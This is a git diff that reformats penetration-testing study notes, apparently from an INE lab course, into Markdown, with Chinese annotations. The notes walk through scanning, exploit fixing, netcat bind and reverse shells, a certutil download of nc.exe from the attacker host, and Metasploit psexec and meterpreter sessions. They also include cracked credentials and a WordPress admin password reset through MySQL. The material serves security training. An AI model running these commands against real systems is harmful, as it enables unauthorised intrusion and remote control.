@@ -1,6 +1,5 @@
-Vulnerability Scanning
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Banner Grabbing
+# Vulnerability Scanning
+## Banner Grabbing
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	識別目標 IP 位址 : ifconfig (192.168.122.1)
 	識別綁定到eth1介面的Kali Linux IP位址，目標IP位址始終是子網路內的下一個IP : 192.168.122.2
@@ -10,8 +9,7 @@ Banner Grabbing
 	nmap -sV --script=banner 192.8.94.3
 	手動 : nc 192.168.122.2 22
 		nc <ip> <port>
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Vulnerability Scanning with Nmap Scripts
+## Vulnerability Scanning with Nmap Scripts
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (192.195.70.2)
 	nmap -sV -O 192.195.70.3
@@ -35,10 +33,8 @@ Vulnerability Scanning with Nmap Scripts
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	 漏洞掃描腳本: 
 	 ls -al /usr/share/nmap/scripts | grep vuln
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Fixing Exploits 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Fixing Exploits
+
+## Fixing Exploits
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (10.10.38.3)
 	ping demo.ine.local
@@ -66,13 +62,11 @@ Fixing Exploits
 	nc -nvlp 1234
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	python 39161.py demo.ine.local 80
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Shells
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Netcat Fundamentals
-=> Netcat <==> "Swiss Army knife" 
-=> 種允許用戶與網路連接進行互動的多功能工具
-=> 連接埠掃描、傳輸檔案以及設定網路偵聽器或反向 shell
+# Shells
+## Netcat Fundamentals
+	=> Netcat <==> "Swiss Army knife" 
+	=> 種允許用戶與網路連接進行互動的多功能工具
+	=> 連接埠掃描、傳輸檔案以及設定網路偵聽器或反向 shell
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ping demo.ine.local (10.0.24.195)
 	nc -help
@@ -117,9 +111,8 @@ Netcat Fundamentals
 	cmd) nc.exe -nvlp 1234 > test.txt
 	kali) nc -nv 10.0.24.195 1234 < test.txt
 	cmd) type test.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Bind Shells
-=> 使用 Netcat 設定綁定 shel
+## Bind Shells
+	=> 使用 Netcat 設定綁定 shel
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (10.10.38.2)
 	將 Netcat 執行檔傳輸到 Windows 系統
@@ -141,9 +134,8 @@ Bind Shells
 	nc -nvlp 1234 -e /bin/bash
 	cmd : nc.exe -nv 10.10.38.2 1234
 	ls	
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Reverse Shells
-=> 使用 Netcat 設定反向 shell
+## Reverse Shells
+	=> 使用 Netcat 設定反向 shell
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (10.10.38.2)
 	cd /usr/share/windows-binaries
@@ -152,9 +144,8 @@ Reverse Shells
 	cmd : certutil -urlcache -f http://10.10.38.2/nc.exe nc.exe
 	nc -nvlp 1234
 	cmd : nc.exe -nv 10.10.38.2 1234 -e cmd.exe
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Exploitation Frameworks
-The Metasploit Framework (MSF)
+# Exploitation Frameworks
+## The Metasploit Framework (MSF)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sS -sV demo.ine.local
 	80/tcp    open  http               Apache httpd 2.2.23 ((Win32) PHP/5.2.14)
@@ -170,10 +161,8 @@ The Metasploit Framework (MSF)
 	use exploit/multi/http/processmaker_exec
 	set RHOSTS demo.ine.local
 	run
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Exploitation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Port Scanning & Enumeration - Windows
+# Windows Exploitation
+## Port Scanning & Enumeration - Windows
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	21/tcp    open  ftp                  Microsoft ftpd
@@ -218,8 +207,7 @@ Port Scanning & Enumeration - Windows
 	[+] 10.0.20.126:445       - 10.0.20.126:445 - Success: '.\administrator:vagrant' Administrator
 
 	[*] Meterpreter session 1 opened (10.10.38.6:4444 -> 10.0.20.126:49550) at 2025-01-16 16:59:30 +0530
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Targeting Microsoft IIS FTP
+## Targeting Microsoft IIS FTP
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	=> 識別薄弱配置、測試匿名存取以及進行暴力攻擊以獲得未經授權的存取和操縱 Web 伺服器內容
 
@@ -232,8 +220,7 @@ Targeting Microsoft IIS FTP
 	[21][ftp] host: demo.ine.local   login: administrator   password: vagrant
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ftp demo.ine.local 21 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Targeting OpenSSh
+## Targeting OpenSSh
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC -p 22 demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -243,8 +230,7 @@ Targeting OpenSSh
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ssh vagrant@demo.ine.local
 	ssh Administrator@demo.ine.local
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Targeting SMB
+## Targeting SMB
 	nmap -sV -sC -p 445 demo.ine.local
 	445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -277,10 +263,9 @@ Targeting SMB
 	set SMBPass vagrant
 	set payload windows/x64/meterpreter/reverse_tcp
 	exploit
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Targeting MySQL Database Server
-=> 獲得對 WordPress 網站的管理控制
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Targeting MySQL Database Server
+	=> 獲得對 WordPress 網站的管理控制
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC -p 3306 demo.ine.local
 	3306/tcp open  mysql   MySQL 5.5.20-log
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -337,10 +322,8 @@ Targeting MySQL Database Server
 	UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
 
 	=> login : http://demo.ine.local:8585/wordpress/wp-admin
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Exploitation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Port Scanning and Enumeration - Linux
+# Linux Exploitation
+## Port Scanning and Enumeration - Linux
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -p1-10000 10.0.26.53
 	512/tcp  open  exec?
@@ -369,8 +352,7 @@ Port Scanning and Enumeration - Linux
 	set RHOSTS 10.0.26.53 
 	
 	[*] Meterpreter session 1 opened (10.10.38.2:4444 -> 10.0.26.53:60634) at 2025-01-16 18:13:05 +0530
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Targeting vsFTPd
+## Targeting vsFTPd
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC -p 21 demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -386,8 +368,7 @@ Targeting vsFTPd
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ftp demo.ine.local 21
 	=> 利用此存取權限上傳反向 shell 負載，以獲得對目標系統的存取權限
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Targeting PHP
+## Targeting PHP
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC -p 80 demo.ine.local
 	80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
@@ -404,9 +385,8 @@ Targeting PHP
 	set RHOSTS demo.ine.local
 	run
 	meterpreter > 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-Targeting SAMBA
-=> Samba 是一個開源軟體套件，可為 SMB/CIFS 用戶端提供無縫文件和列印服務
+## Targeting SAMBA
+	=> Samba 是一個開源軟體套件，可為 SMB/CIFS 用戶端提供無縫文件和列印服務
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -p 445 demo.ine.local	
 	445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
